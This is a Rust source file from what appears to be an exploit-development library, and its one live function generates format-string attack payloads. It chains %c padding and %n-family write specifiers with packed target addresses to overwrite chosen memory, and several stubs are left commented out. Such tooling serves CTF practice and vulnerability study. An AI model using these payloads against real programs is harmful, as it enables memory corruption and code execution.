use std::collections::HashMap;
use crate::util::{p64, Error};

// pub struct FmtStr {
//     pub offset: usize,
//     pub padlen: usize,
//     pub numbwritten: usize,
//     pub badbytes: Vec<u8>,
// }
//
// impl FmtStr {
//     pub fn new(
//         offset: usize,
//         padlen: usize,
//         numbwritten: usize,
//         badbytes: Vec<u8>
//     ) -> Self {
//         Self { offset, padlen, numbwritten, badbytes }
//     }
// }

#[derive(Debug, Clone, Copy)]
pub enum SizedWrite {
    Byte(u8),
    Short(u16),
    Int(u32),
}

impl SizedWrite {
    fn mask(&self) -> u64 {
        match &self {
            SizedWrite::Byte(_) => 0xff,
            SizedWrite::Short(_) => 0xffff,
            SizedWrite::Int(_) => 0xffffffff,
        }
    }

    fn size_spec(&self) -> String {
        match &self {
            SizedWrite::Byte(_) => "hh".to_string(),
            SizedWrite::Short(_) => "h".to_string(),
            SizedWrite::Int(_) => "".to_string(),
        }
    }

    fn val(&self) -> u64 {
        match &self {
            SizedWrite::Byte(v) => *v as u64,
            SizedWrite::Short(v) => *v as u64,
            SizedWrite::Int(v) => *v as u64,
        }
    }
}

/// This is a substitute for pwntools 'atoms'
pub struct FmtWrite {
    pub addr: u64,
    pub value: SizedWrite,
}

//impl FmtWrite {
//    pub(crate) fn compute_padding(&self, counter: usize) -> usize {
//        let wanted = self.value.val();
//        let mask = self.value.mask();
//        let mut padding: usize = 0;
//        loop {
//            let diff: usize = (wanted ^ ((counter + padding) as u64 & mask)) as usize;
//            if diff == 0 {
//                break
//            }
//            padding += diff & (diff ^ (diff - 1))
//        }
//        padding
//    }
//}
//
//
//pub fn make_payload_dollar(
//    offset: usize,
//    writes: Vec<FmtWrite>,
//    numbwritten: usize
//) -> (Vec<u8>, Vec<u8>) {
//    // idk if this should be configurable
//    let countersize = 4;
//
//    let fmt: Vec<u8> = vec![];
//    let data: Vec<u8> = vec![];
//
//    let mut counter = numbwritten;
//
//    for (idx, write) in writes.iter().enumerate() {
//        let padding = write.compute_padding(counter);
//        counter = (counter + padding) % (1 << (countersize * 8));
//    }
//
//    (fmt, data)
//}
//
//pub fn fmtstr_payload(
//    offset: usize,
//    writes: Vec<FmtWrite>,
//    overflows: usize,
//    badbytes: Vec<u8>,
//) -> Vec<u8> {
//    let mut fmt: Vec<u8> = vec![];
//    for _ in 0..1000000 {
//        let data_offset = fmt.len();
//    }
//    vec![]
//}

pub fn fmtstr_payload(
    offset: usize,
    writes: Vec<FmtWrite>,
    bytes_written: usize,
) -> Result<Vec<u8>, Error> {
    let mut cur_offset = offset;
    let mut cur_bytes_written = bytes_written;
    let mut payload = vec![];

    let pointer_start = offset + writes.len() * 3;
    let pointer_start_bytes = (writes.len() * 3) * 8;

    for (idx, write) in writes.iter().enumerate() {
        println!("bytes written: {:x}", cur_bytes_written);
        let bytes_to_write = (write.value.val() - (cur_bytes_written as u64 & write.value.mask())) & write.value.mask();
        println!("bytes to write: {:x}", bytes_to_write);
        let c_spec = format!("%{}c", bytes_to_write).as_bytes().to_vec();

        let mut resize_amt = 0;

        if bytes_to_write > 99999999999999 {
            panic!("please reconsider your life choices");
        } else if bytes_to_write > 999999 {
            resize_amt += 16;
        } else {
            resize_amt += 8;
        }

        cur_offset += c_spec.len() / 8;

        let n_spec = format!("%{}${}n", pointer_start + idx, write.value.size_spec()).as_bytes().to_vec();
        if cur_offset > 99999 {
            panic!("please reconsider your life choices");
        } else {
            resize_amt += 8;
        }

        let mut specs = [c_spec, n_spec].concat();
        cur_bytes_written += bytes_to_write as usize + resize_amt - specs.len();
        specs.resize(resize_amt, 0x41);

        cur_offset += specs.len() / 8;

        payload.append(&mut specs)
    }

    payload.resize(pointer_start_bytes, 0x41);

    for write in writes {
        payload.append(&mut p64(write.addr)?);
    }

    Ok(payload)
}
